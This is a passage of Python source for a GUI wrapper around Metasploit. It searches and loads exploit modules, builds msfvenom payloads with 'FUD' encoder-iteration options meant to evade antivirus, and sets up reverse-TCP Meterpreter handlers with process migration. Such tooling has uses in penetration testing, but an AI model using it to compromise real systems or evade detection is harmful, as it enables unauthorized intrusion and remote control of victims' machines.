                if re.search(r'msf[56]?\s*>', text) or (len(self.creds_output_buffer) > 1 and "=====" in ''.join(self.creds_output_buffer)):
                    full_creds_output = ''.join(self.creds_output_buffer)
                    self._parse_creds_output(full_creds_output)
                    self.creds_output_buffer = []
        
        self.root.after(0, _update)
    
    def _parse_search_output(self, text):
        """Parse Metasploit search output and populate treeviews."""
        if not self.active_search:
            return
        
        # Add to buffer
        self.search_output_buffer.append(text)
        
        # For "show" commands, look for module list format (different from search)
        if self.is_show_command:
            # "show" commands typically list modules directly, look for module paths
            if re.search(r'exploit/|auxiliary/|payload/|encoder/|nop/|post/|evasion/', text):
                self.search_parsing = True
                # Cancel any existing timeout
                if self.search_timeout_id:
                    self.root.after_cancel(self.search_timeout_id)
                # Set a timeout to process results if no prompt is seen
                self.search_timeout_id = self.root.after(2000, self._process_search_results)
            # Process when we see a prompt - be more lenient with prompt detection
            if re.search(r'msf[56]?\s*>', text) or re.search(r'msf[56]?\s*\[', text) or re.search(r'^\s*>\s*$', text):
                # Cancel timeout since we got a prompt
                if self.search_timeout_id:
                    self.root.after_cancel(self.search_timeout_id)
                    self.search_timeout_id = None
                # Give a small delay to ensure all output is captured
                self.root.after(200, lambda: self._process_search_results() if self.search_parsing else None)
                return
        
        # For "search" commands, look for "Matching Modules" header
        if "Matching Modules" in text:
            self.search_parsing = True
            return
        
        # Check for no results
        if "No results" in text or "No matching modules" in text:
            self._process_search_results()
            return
        
        # Check if we've reached the end of search results
        # Metasploit search typically ends with a prompt
        if re.search(r'msf[56]?\s*>', text) or re.search(r'msf[56]?\s*\[', text):
            # We've reached a prompt, process the buffer
            if self.search_parsing or len(self.search_output_buffer) > 1:
                self._process_search_results()
            return
    
    def _process_search_results(self):
        """Process collected search output and populate appropriate treeview."""
        if not self.active_search or not self.search_output_buffer:
            return
        
        # Cancel any pending timeout
        if self.search_timeout_id:
            self.root.after_cancel(self.search_timeout_id)
            self.search_timeout_id = None
        
        # Join all buffered output
        full_output = ''.join(self.search_output_buffer)
        
        # Save is_show_command flag before resetting
        is_show = self.is_show_command
        
        # Clear the buffer
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = False
        
        # Parse based on active search type
        if self.active_search == 'exploit':
            self._populate_exploit_tree(full_output, is_show)
        elif self.active_search == 'auxiliary':
            self._populate_auxiliary_tree(full_output, is_show)
        
        # Clear active search
        self.active_search = None
    
    def _populate_exploit_tree(self, output, is_show_command=False):
        """Parse exploit search results and populate exploit_tree."""
        # Clear existing items
        for item in self.exploit_tree.get_children():
            self.exploit_tree.delete(item)
        
        # Check for no results
        if "No results" in output or "No matching modules" in output or not output.strip():
            if not is_show_command or not re.search(r'exploit/', output):
                self.exploit_tree.insert("", tk.END, values=("No results found", "", ""))
                return
        
        # Parse Metasploit output format
        lines = output.split('\n')
        in_results = False
        header_passed = False
        
        for line in lines:
            stripped = line.strip()
            
            # Skip empty lines
            if not stripped:
                continue
            
            # Handle "show" command format (just module paths)
            if is_show_command:
                # Look for exploit module paths - handle both simple paths and paths with descriptions
                # Also handle lines that might have leading/trailing whitespace or other formatting
                if re.search(r'exploit/', stripped):
                    # Extract module name - could be at start or after some whitespace/numbers
                    match = re.search(r'(exploit/[^\s]+)', stripped)
                    if match:
                        name = match.group(1)
                        rank = ""
                        # Try to extract description (everything after the module path)
                        desc_match = re.search(r'exploit/[^\s]+\s+(.+)', stripped)
                        description = desc_match.group(1) if desc_match else ""
                        self.exploit_tree.insert("", tk.END, values=(name, rank, description))
                continue
            
            # Handle "search" command format
            # Skip until we see "Matching Modules"
            if "Matching Modules" in line:
                in_results = True
                continue
            
            if not in_results:
                continue
            
            # Skip separator lines
            if "===" in line or "----" in line:
                header_passed = True
                continue
            
            if not header_passed or not stripped:
                continue
            
            # Parse result line: number, name, date, rank, check, description
            # Format: "  0  exploit/path/name  date  rank  check  description"
            if re.match(r'^\d+', stripped):
                parts = stripped.split()
                if len(parts) >= 2:
                    name = parts[1]
                    rank = parts[4] if len(parts) > 4 else ""
                    # Description is everything after rank (or check if present)
                    desc_start = 6 if len(parts) > 5 and parts[5] in ['Yes', 'No'] else 5
                    description = ' '.join(parts[desc_start:]) if len(parts) > desc_start else ""
                    
                    self.exploit_tree.insert("", tk.END, values=(name, rank, description))
    
    def _populate_auxiliary_tree(self, output, is_show_command=False):
        """Parse module search results and populate aux_tree."""
        # Clear existing items
        for item in self.aux_tree.get_children():
            self.aux_tree.delete(item)
        
        # Check for no results
        if "No results" in output or "No matching modules" in output or not output.strip():
            if not is_show_command or not re.search(r'(exploit|auxiliary|payload|encoder|nop|post|evasion)/', output):
                self.aux_tree.insert("", tk.END, values=("No results found", "", ""))
                return
        
        # Parse Metasploit output format
        lines = output.split('\n')
        in_results = False
        header_passed = False
        
        for line in lines:
            stripped = line.strip()
            
            # Skip empty lines
            if not stripped:
                continue
            
            # Handle "show" command format (just module paths)
            if is_show_command:
                # Look for module paths - check for any module type
                # Use search instead of match to find module paths anywhere in the line
                match = re.search(r'((exploit|auxiliary|payload|encoder|nop|post|evasion)/[^\s]+)', stripped)
                if match:
                    name = match.group(1)
                    # Extract module type from name
                    module_type = "unknown"
                    if '/' in name:
                        module_type = name.split('/')[0]
                    # Try to extract description (everything after the module path)
                    desc_match = re.search(r'(exploit|auxiliary|payload|encoder|nop|post|evasion)/[^\s]+\s+(.+)', stripped)
                    description = desc_match.group(2) if desc_match else ""
                    self.aux_tree.insert("", tk.END, values=(name, module_type, description))
                continue
            
            # Handle "search" command format
            # Skip until we see "Matching Modules"
            if "Matching Modules" in line:
                in_results = True
                continue
            
            if not in_results:
                continue
            
            # Skip separator lines
            if "===" in line or "----" in line:
                header_passed = True
                continue
            
            if not header_passed or not stripped:
                continue
            
            # Parse result line
            if re.match(r'^\d+', stripped):
                parts = stripped.split()
                if len(parts) >= 2:
                    name = parts[1]
                    
                    # Extract module type from name (e.g., "exploit/...", "auxiliary/...", etc.)
                    module_type = "unknown"
                    if '/' in name:
                        module_type = name.split('/')[0]
                    
                    # Description is everything after rank (or check if present)
                    desc_start = 6 if len(parts) > 5 and parts[5] in ['Yes', 'No'] else 5
                    description = ' '.join(parts[desc_start:]) if len(parts) > desc_start else ""
                    
                    self.aux_tree.insert("", tk.END, values=(name, module_type, description))
    
    def send_console_command(self, event=None):
        """Send command to console."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = self.command_entry.get().strip()
        if not command:
            return
        
        # Track command history
        self.command_history.append(command)
        self.command_history_index = len(self.command_history)
        
        # Update history display if tab exists (thread-safe)
        if hasattr(self, 'command_history_text'):
            def _update_history():
                if hasattr(self, 'command_history_text'):
                    self.command_history_text.insert(tk.END, f"{command}\n")
                    self.command_history_text.see(tk.END)
            self.root.after(0, _update_history)
        
        # Log activity
        self.log_activity("Command", command, "Console")
        
        self.console_output_callback(f"msf6 > {command}\n", "output")
        
        if self.console.send_command(command):
            self.command_entry.delete(0, tk.END)
        else:
            self.console_output_callback("Failed to send command.\n", "error")
    
    def log_activity(self, activity_type, action, details=""):
        """Log an activity."""
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = {
            'time': timestamp,
            'type': activity_type,
            'action': action,
            'details': details
        }
        self.activity_logs.append(log_entry)
        
        # Update activity logs display if tab exists (thread-safe)
        if hasattr(self, 'activity_logs_tree'):
            def _update_activity():
                if hasattr(self, 'activity_logs_tree'):
                    self.activity_logs_tree.insert("", tk.END, values=(timestamp, activity_type, action, details))
                    self.activity_logs_tree.see(tk.END)
            self.root.after(0, _update_activity)
    
    def command_history_up(self, event):
        """Navigate up in command history."""
        if self.command_history and self.command_history_index > 0:
            self.command_history_index -= 1
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, self.command_history[self.command_history_index])
        return "break"
    
    def command_history_down(self, event):
        """Navigate down in command history."""
        if self.command_history:
            if self.command_history_index < len(self.command_history) - 1:
                self.command_history_index += 1
                self.command_entry.delete(0, tk.END)
                self.command_entry.insert(0, self.command_history[self.command_history_index])
            else:
                self.command_history_index = len(self.command_history)
                self.command_entry.delete(0, tk.END)
        return "break"
    
    def quick_command(self, command):
        """Send quick command."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.command_entry.delete(0, tk.END)
        self.command_entry.insert(0, command)
        self.send_console_command()
    
    def clear_console(self):
        """Clear console output."""
        self.console_output.delete(1.0, tk.END)
    
    def update_database_status(self):
        """Update database status indicator."""
        if hasattr(self, 'db_status_label'):
            if self.database_initializing:
                self.db_status_label.config(text="Database: Initializing...", foreground="orange")
            elif self.database_connected:
                self.db_status_label.config(text="Database: Connected", foreground="green")
            else:
                self.db_status_label.config(text="Database: Not Connected", foreground="red")
    
    def check_database_status(self):
        """Check database connection status."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # First check current status
        self.console.send_command("db_status")
        self.console_output_callback("Checking database status...\n", "output")
        
        # Only try to connect if not already connected
        if not self.database_connected:
            db_yml = self._find_database_yml()
            if db_yml:
                self.console_output_callback(f"Found database config: {db_yml}\nAttempting to connect...\n", "output")
                
                # Try multiple connection methods
                # Method 1: Try with yaml file
                self.console.send_command(f"db_connect -y {db_yml}")
                
                # Method 2: Try default connection (msfdb init creates database at ~/.msf4/db)
                # The database is typically accessible via local socket
                self.root.after(2000, lambda: self._try_connection_strings() if not self.database_connected else None)
                
                # Method 3: Check status after attempts
                self.root.after(4000, lambda: self.console.send_command("db_status") if not self.database_connected else None)
    
    def _try_default_connection(self):
        """Try default database connection methods."""
        # First, try to list saved services (msfdb init might have saved one)
        self.console.send_command("db_connect -l")
        
        # After a delay, try connection strings
        self.root.after(2000, lambda: self._try_connection_strings())
    
    def _try_connection_strings(self):
        """Try various connection string formats."""
        # Don't try if already connected
        if self.database_connected:
            return
        
        # Try common default connections after msfdb init
        # msfdb init typically creates a database accessible via local socket
        default_connections = [
            "msf@localhost/msf",
            "msf@127.0.0.1/msf", 
            "msf@localhost:5432/msf",
        ]
        
        # Try first default connection
        self.console.send_command(f"db_connect {default_connections[0]}")
        
        # If that doesn't work, try reading from database.yml and extracting connection info
        # But only if not already connected
        if not self.database_connected:
            db_yml = self._find_database_yml()
            if db_yml:
                try:
                    with open(db_yml, 'r') as f:
                        content = f.read()
                        # Look for connection details in the file
                        import re
                        # Try to extract username, password, host, port, database
                        # Improved regex to handle various formats
                        username_match = re.search(r'username:\s*["\']?([^"\'\n\s]+)["\']?', content)
                        password_match = re.search(r'password:\s*["\']?([^"\'\n]+)["\']?', content)
                        host_match = re.search(r'host:\s*["\']?([^"\'\n\s]+)["\']?', content)
                        port_match = re.search(r'port:\s*(\d+)', content)
                        database_match = re.search(r'database:\s*["\']?([^"\'\n\s]+)["\']?', content)
                        
                        if username_match and database_match:
                            user = username_match.group(1)
                            db = database_match.group(1)
                            host = host_match.group(1) if host_match else "localhost"
                            port = port_match.group(1) if port_match else "5432"
                            password = password_match.group(1).strip() if password_match else ""
                            
                            # Build connection string - handle empty password
                            if password and password != "''" and password != '""':
                                conn_str = f"{user}:{password}@{host}:{port}/{db}"
                            else:
                                conn_str = f"{user}@{host}:{port}/{db}"
                            
                            # Only try if still not connected
                            def try_conn(cs):
                                if not self.database_connected:
                                    self.console_output_callback(f"Trying connection: {user}@{host}:{port}/{db}\n", "output")
                                    self.console.send_command(f"db_connect {cs}")
                            
                            self.root.after(2000, lambda: try_conn(conn_str))
                            
                            # Also try without port (uses default)
                            if port != "5432":
                                conn_str_no_port = f"{user}@{host}/{db}" if not password else f"{user}:{password}@{host}/{db}"
                                self.root.after(4000, lambda: try_conn(conn_str_no_port) if not self.database_connected else None)
                except Exception as e:
                    if not self.database_connected:
                        self.console_output_callback(f"Error parsing database.yml: {e}\n", "error")
            
            # As last resort, try using the database.yml file directly even if parsing failed
            # Sometimes the file exists but has a different format
            if db_yml:
                def try_yaml():
                    if not self.database_connected:
                        self.console.send_command(f"db_connect -y {db_yml}")
                self.root.after(6000, try_yaml)
    
    def _find_database_yml(self):
        """Find Metasploit database.yml file."""
        possible_paths = [
            os.path.expanduser("~/.msf4/database.yml"),
            os.path.expanduser("~/msf4/database.yml"),
            os.path.expanduser("~/.msf4/config/database.yml"),
            "/opt/metasploit-framework/config/database.yml",
            "/usr/share/metasploit-framework/config/database.yml",
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None
    
    def _read_database_config(self):
        """Read database configuration from database.yml."""
        db_yml = self._find_database_yml()
        if not db_yml:
            return None
        
        try:
            # Try to import yaml
            try:
                import yaml
                with open(db_yml, 'r') as f:
                    config = yaml.safe_load(f)
                # Check if production section exists and has valid credentials
                if config and 'production' in config:
                    prod_config = config['production']
                    if prod_config and ('database' in prod_config or 'adapter' in prod_config):
                        return config
            except ImportError:
                # yaml not available, try to parse manually
                pass
        except Exception as e:
            # If yaml parsing fails, try manual parsing
            pass
        
        # If yaml not available or parsing failed, try to parse manually
        try:
            with open(db_yml, 'r') as f:
                content = f.read()
            # Check if it has production section
            if 'production' in content and ('database' in content or 'adapter' in content):
                return {'file': db_yml, 'has_production': True}
        except:
            pass
        return None
    
    def _get_database_connection_string(self):
        """Get database connection string from database.yml or use default."""
        db_yml = self._find_database_yml()
        if not db_yml:
            return None
        
        try:
            import yaml
            with open(db_yml, 'r') as f:
                config = yaml.safe_load(f)
            
            if config and 'production' in config:
                prod = config['production']
                # Try to build connection string
                if 'adapter' in prod and prod['adapter'] == 'postgresql':
                    user = prod.get('username', 'msf')
                    passwd = prod.get('password', '')
                    host = prod.get('host', 'localhost')
                    port = prod.get('port', 5432)
                    database = prod.get('database', 'msf')
                    
                    if passwd:
                        return f"{user}:{passwd}@{host}:{port}/{database}"
                    else:
                        return f"{user}@{host}:{port}/{database}"
        except:
            pass
        
        # If parsing fails, try default local connection
        # Metasploit typically uses msf user with msf database
        return "msf@localhost:5432/msf"
    
    def initialize_database(self):
        """Initialize Metasploit database."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running. Please start the console first.")
            return
        
        # Check current status first
        self.console.send_command("db_status")
        
        # Wait a moment for status, then proceed
        self.root.after(1000, lambda: self._proceed_with_initialization())
    
    def _proceed_with_initialization(self):
        """Proceed with database initialization after status check."""
        # If already connected, inform user
        if self.database_connected:
            messagebox.showinfo("Info", "Database is already connected!")
            return
        
        if self.database_initializing:
            messagebox.showinfo("Info", "Database initialization is already in progress.")
            return
        
        # Check if database.yml exists
        db_yml = self._find_database_yml()
        
        if db_yml:
            # Database is configured, try to connect
            self.database_initializing = True
            self.update_database_status()
            self.console_output_callback(f"Connecting to database using: {db_yml}\n", "output")
            
            # Try with yaml file (only once - don't spam connections)
            self.console.send_command(f"db_connect -y {db_yml}")
        else:
            # No database config found, offer to initialize
            response = messagebox.askyesno(
                "Initialize Database",
                "Metasploit database is not initialized.\n\n"
                "Would you like to initialize it now?\n\n"
                "This will run 'msfdb init' which will:\n"
                "1. Set up PostgreSQL database\n"
                "2. Create database.yml configuration\n"
                "3. Connect to the database\n\n"
                "Note: This requires PostgreSQL to be installed.",
                icon='question'
            )
            
            if response:
                # Try to run msfdb init
                self._run_msfdb_init()
            else:
                # Show manual instructions
                self._show_database_setup_instructions()
    
    def _run_msfdb_init(self):
        """Run msfdb init command."""
        self.database_initializing = True
        self.update_database_status()
        
        self.console_output_callback(
            "\n[Database Setup] Attempting to initialize database...\n"
            "This may take a moment. Please wait...\n\n",
            "output"
        )
        
        # Check if msfdb command exists
        msfdb_path = shutil.which('msfdb')
        if msfdb_path:
            # Run msfdb init in a subprocess (with sudo support if needed)
            try:
                result = self._run_with_sudo(
                    [msfdb_path, 'init'],
                    timeout=60
                )
                
                if result.returncode == 0:
                    self.console_output_callback(
                        f"Database initialized successfully!\n{result.stdout}\n",
                        "success"
                    )
                    # Try to connect after initialization
                    db_yml = self._find_database_yml()
                    if db_yml:
                        self.root.after(2000, lambda: self.console.send_command(f"db_connect -y {db_yml}"))
                else:
                    self.console_output_callback(
                        f"Database initialization had issues:\n{result.stderr}\n{result.stdout}\n",
                        "error"
                    )
                    self._show_database_setup_instructions()
            except subprocess.TimeoutExpired:
                self.console_output_callback("Database initialization timed out.\n", "error")
                self._show_database_setup_instructions()
            except Exception as e:
                self.console_output_callback(
                    f"Error running msfdb init: {e}\n",
                    "error"
                )
                self._show_database_setup_instructions()
        else:
            self.console_output_callback(
                "msfdb command not found. Please initialize database manually.\n",
                "error"
            )
            self._show_database_setup_instructions()
    
    def _show_database_setup_instructions(self):
        """Show database setup instructions."""
        instructions = """
═══════════════════════════════════════════════════════════
  Database Setup Instructions
═══════════════════════════════════════════════════════════

To set up the Metasploit database, run one of these commands
in your terminal:

Option 1 (Recommended):
  msfdb init

Option 2 (Manual PostgreSQL setup):
  1. Install PostgreSQL:
     sudo apt-get install postgresql  # Debian/Ubuntu
     sudo pacman -S postgresql        # Arch/Manjaro
     sudo yum install postgresql      # RHEL/CentOS

  2. Start PostgreSQL service:
     sudo systemctl start postgresql
     sudo systemctl enable postgresql

  3. Initialize database:
     msfdb init

Option 3 (If msfdb is not available):
  1. Start PostgreSQL service
  2. Create database manually
  3. Configure ~/.msf4/database.yml
  4. Use 'db_connect' command in console

After initialization, click 'Check Status' to verify connection.

═══════════════════════════════════════════════════════════
"""
        self.console_output_callback(instructions, "warning")
        self.database_initializing = False
        self.update_database_status()
    
    def run_msfdb_init_gui(self):
        """Run msfdb init from GUI with output in console."""
        response = messagebox.askyesno(
            "Initialize Database",
            "This will run 'msfdb init' to set up the Metasploit database.\n\n"
            "This requires:\n"
            "- PostgreSQL to be installed\n"
            "- Appropriate permissions\n\n"
            "Continue?",
            icon='question'
        )
        
        if response:
            self._run_msfdb_init()
    
    def auto_initialize_database(self):
        """Automatically initialize database when errors are detected."""
        if self.database_connected or self.database_initializing:
            return
        
        if not self.console or not self.console.running:
            return
        
        # Only auto-init if setting is enabled
        if not self.settings.get('auto_init_db', True):
            return
        
        # First check current status - might already be connected
        self.console.send_command("db_status")
        
        # Wait a moment for status response, then try to connect if still not connected
        self.root.after(1500, lambda: self._auto_connect_if_needed())
    
    def _auto_connect_if_needed(self):
        """Auto-connect if still not connected after status check."""
        if self.database_connected:
            return
        
        self.database_initializing = True
        self.update_database_status()
        
        # Check if database.yml exists
        db_yml = self._find_database_yml()
        
        if db_yml:
            # Database is configured, try to connect (only once)
            self.console_output_callback(
                f"\n[Auto] Attempting to connect to database...\n",
                "warning"
            )
            self.console.send_command(f"db_connect -y {db_yml}")
        else:
            # No config found, just check status
            self.console_output_callback(
                "\n[Auto] Database not connected. No database configuration found.\n"
                "Use 'Initialize Database' button to set up the database.\n",
                "warning"
            )
        
        # Reset initializing flag after a delay
        self.root.after(3000, lambda: setattr(self, 'database_initializing', False) if not self.database_connected else None)
        self.root.after(3000, self.update_database_status)
    
    # Exploit methods
    def search_exploits(self):
        """Search for exploits."""
        query = self.exploit_search_entry.get().strip()
        if not query:
            messagebox.showwarning("Warning", "Please enter a search query.")
            return
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear previous results
        for item in self.exploit_tree.get_children():
            self.exploit_tree.delete(item)
        
        # Set search state
        self.active_search = 'exploit'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = False
        
        # Insert placeholder
        self.exploit_tree.insert("", tk.END, values=("Searching...", "Please wait", ""))
        
        command = f"search type:exploit {query}"
        self.console.send_command(command)
        self.console_output_callback(f"Searching for exploits: {query}\n", "output")
    
    def show_all_exploits(self):
        """Show all exploits."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear previous results
        for item in self.exploit_tree.get_children():
            self.exploit_tree.delete(item)
        
        # Set search state
        self.active_search = 'exploit'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = True
        
        # Insert placeholder
        self.exploit_tree.insert("", tk.END, values=("Loading...", "Please wait", ""))
        
        self.console.send_command("show exploits")
        self.console_output_callback("Showing all exploits...\n", "output")
    
    def use_exploit(self, event=None):
        """Use selected exploit."""
        selection = self.exploit_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select an exploit.")
            return
        
        item = self.exploit_tree.item(selection[0])
        exploit_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"use {exploit_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Using exploit: {exploit_name}\n", "success")
    
    def show_exploit_info(self):
        """Show exploit information."""
        selection = self.exploit_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select an exploit.")
            return
        
        item = self.exploit_tree.item(selection[0])
        exploit_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"info {exploit_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Showing info for: {exploit_name}\n", "output")
    
    def show_exploit_options(self):
        """Show exploit options."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("show options")
        self.console_output_callback("Showing exploit options...\n", "output")
    
    def auto_setup_exploit(self):
        """Automatically setup exploit with common options."""
        selection = self.exploit_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select an exploit first.")
            return
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        item = self.exploit_tree.item(selection[0])
        exploit_name = item['values'][0]
        
        # Use exploit
        self.console.send_command(f"use {exploit_name}")
        self.console_output_callback(f"Using exploit: {exploit_name}\n", "success")
        
        # Show options and set common values
        self.console.send_command("show options")
        self.console_output_callback("Auto-setting common options...\n", "output")
        
        # Common options (user can modify after)
        self.console.send_command("set LHOST 0.0.0.0")
        self.console.send_command("set LPORT 4444")
        self.console.send_command("set payload windows/meterpreter/reverse_tcp")
        
        self.console_output_callback("Auto-setup complete. Check options and adjust as needed.\n", "success")
    
    # Payload methods
    def browse_save_location(self):
        """Browse for payload save location."""
        directory = filedialog.askdirectory(initialdir=self.payload_save_path)
        if directory:
            self.payload_save_path = directory
            self.save_path_var.set(directory)
    
    def generate_payload(self):
        """Generate payload with FUD options."""
        payload_type = self.payload_type.get()
        lhost = self.lhost_entry.get().strip()
        lport = self.lport_entry.get().strip()
        format_type = self.format_var.get()
        
        if not lhost or not lport:
            messagebox.showwarning("Warning", "Please fill in all required fields.")
            return
        
        # Find msfvenom on the system
        msfvenom_path = shutil.which('msfvenom')
        if not msfvenom_path:
            # Check common installation locations
            for path in [
                '/usr/bin/msfvenom',
                '/opt/metasploit-framework/msfvenom',
                '/usr/local/bin/msfvenom',
                '/usr/share/metasploit-framework/msfvenom',
                os.path.expanduser('~/metasploit-framework/msfvenom'),
            ]:
                if os.path.exists(path) and os.access(path, os.X_OK):
                    msfvenom_path = path
                    break
        
        if not msfvenom_path:
            messagebox.showerror("Error", "msfvenom not found. Please install Metasploit Framework.")
            return
        
        try:
            cmd = [
                msfvenom_path,
                '-p', payload_type,
                'LHOST=' + lhost,
                'LPORT=' + lport,
                '-f', format_type
            ]
            
            # Add FUD options
            if self.fud_enabled.get():
                encoder = self.encoder_var.get()
                iterations = self.iterations_var.get()
                badchars = self.badchars_entry.get().strip()
                
                cmd.extend(['-e', encoder])
                cmd.extend(['-i', iterations])
                
                if badchars:
                    cmd.extend(['-b', badchars])
            
            # Output file
            save_path = self.save_path_var.get()
            if not os.path.exists(save_path):
                os.makedirs(save_path, exist_ok=True)
            
            # Generate filename based on payload type
            filename = payload_type.replace('/', '_').replace('\\', '_') + '.' + format_type
            output_file = os.path.join(save_path, filename)
            cmd.extend(['-o', output_file])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.payload_output.delete(1.0, tk.END)
                output_text = f"Payload generated successfully!\n"
                output_text += f"File saved to: {output_file}\n\n"
                output_text += result.stdout
                self.payload_output.insert(1.0, output_text)
                self.console_output_callback(f"Payload generated: {payload_type}\n", "success")
                messagebox.showinfo("Success", f"Payload saved to:\n{output_file}")
            else:
                error_msg = result.stderr or result.stdout
                messagebox.showerror("Error", f"Failed to generate payload:\n{error_msg}")
        except Exception as e:
            messagebox.showerror("Error", f"Error generating payload: {str(e)}")
    
    def save_payload_to_file(self):
        """Save payload to user-specified file."""
        payload = self.payload_output.get(1.0, tk.END).strip()
        if not payload:
            messagebox.showwarning("Warning", "No payload to save.")
            return
        
        filename = filedialog.asksaveasfilename(
            initialdir=self.payload_save_path,
            defaultextension=".txt",
            filetypes=[
                ("All files", "*.*"),
                ("Executable", "*.exe"),
                ("Text files", "*.txt"),
                ("Python", "*.py"),
                ("Bash", "*.sh")
            ]
        )
        
        if filename:
            try:
                with open(filename, 'wb') as f:
                    # Try to decode if it's text, otherwise write binary
                    try:
                        f.write(payload.encode())
                    except:
                        f.write(payload)
                messagebox.showinfo("Success", f"Payload saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save payload: {str(e)}")
    
    # Auxiliary methods (now handles all module types)
    def search_auxiliary(self):
        """Search for modules by type."""
        query = self.aux_search_entry.get().strip()
        module_type = self.aux_module_type_var.get()
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear previous results
        for item in self.aux_tree.get_children():
            self.aux_tree.delete(item)
        
        # Set search state
        self.active_search = 'auxiliary'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = False
        
        # Insert placeholder
        self.aux_tree.insert("", tk.END, values=("Searching...", "Please wait", ""))
        
        if query:
            command = f"search type:{module_type} {query}"
        else:
            command = f"search type:{module_type}"
        
        self.console.send_command(command)
        self.console_output_callback(f"Searching for {module_type} modules: {query}\n", "output")
    
    def show_all_modules(self):
        """Show all modules of selected type."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        module_type = self.aux_module_type_var.get()
        
        # Clear previous results
        for item in self.aux_tree.get_children():
            self.aux_tree.delete(item)
        
        # Set search state
        self.active_search = 'auxiliary'
        self.search_output_buffer = []
        self.search_parsing = False
        self.is_show_command = True
        
        # Insert placeholder
        self.aux_tree.insert("", tk.END, values=("Loading...", "Please wait", ""))
        
        # Handle pluralization for show command
        if module_type == "post":
            command = "show post"
        else:
            command = f"show {module_type}s"
        
        self.console.send_command(command)
        self.console_output_callback(f"Showing all {module_type} modules...\n", "output")
    
    def use_auxiliary(self, event=None):
        """Use selected module."""
        selection = self.aux_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a module.")
            return
        
        item = self.aux_tree.item(selection[0])
        module_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"use {module_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Using module: {module_name}\n", "success")
    
    def show_auxiliary_info(self):
        """Show module information."""
        selection = self.aux_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a module.")
            return
        
        item = self.aux_tree.item(selection[0])
        module_name = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"info {module_name}"
        self.console.send_command(command)
        self.console_output_callback(f"Showing info for: {module_name}\n", "output")
    
    def show_auxiliary_options(self):
        """Show module options."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("show options")
        self.console_output_callback("Showing module options...\n", "output")
    
    # Handler methods
    def setup_handler(self):
        """Setup handler with configured options."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        handler_type = self.handler_type_var.get()
        payload = self.handler_payload_var.get()
        lhost = self.handler_lhost_entry.get().strip()
        lport = self.handler_lport_entry.get().strip()
        
        if not lhost or not lport:
            messagebox.showwarning("Warning", "Please fill in LHOST and LPORT.")
            return
        
        # Setup handler
        self.console.send_command(f"use {handler_type}")
        self.console.send_command(f"set PAYLOAD {payload}")
        self.console.send_command(f"set LHOST {lhost}")
        self.console.send_command(f"set LPORT {lport}")
        
        if self.auto_migrate_var.get():
            self.console.send_command("set AutoRunScript migrate -f")
        
        if self.exit_on_session_var.get():
            self.console.send_command("set ExitOnSession false")
        
        self.console.send_command("show options")
        
        status_text = f"Handler setup complete!\n"
        status_text += f"Type: {handler_type}\n"
        status_text += f"Payload: {payload}\n"
        status_text += f"LHOST: {lhost}\n"
        status_text += f"LPORT: {lport}\n"
        
        self.handler_status.delete(1.0, tk.END)
        self.handler_status.insert(1.0, status_text)
        
        self.console_output_callback("Handler setup complete.\n", "success")
    
    def start_handler(self):
        """Start the handler."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("exploit -j")
        self.handler_status.insert(tk.END, "\nHandler started in background (job mode).\n")
        self.console_output_callback("Handler started.\n", "success")
    
    def stop_handler(self):
        """Stop the handler."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("jobs -K")
        self.handler_status.insert(tk.END, "\nHandler stopped.\n")
        self.console_output_callback("Handler stopped.\n", "warning")
    
    # Commands and help methods
    def update_commands_display(self):
        """Update commands display based on category."""
        category = self.command_category_var.get()
        
        commands_text = f"=== {category} Commands ===\n\n"
        
        commands_dict = {
            "General": """help              - Show help menu
version           - Show version
banner            - Show banner
save              - Save current environment
load              - Load a plugin
exit              - Exit Metasploit
quit              - Quit Metasploit
irb               - Open Ruby shell
pry               - Open Pry debugger
history           - Show command history
sessions          - List active sessions
jobs              - List background jobs
""",
            "Exploit": """use <exploit>     - Use an exploit module
show exploits     - List all exploits
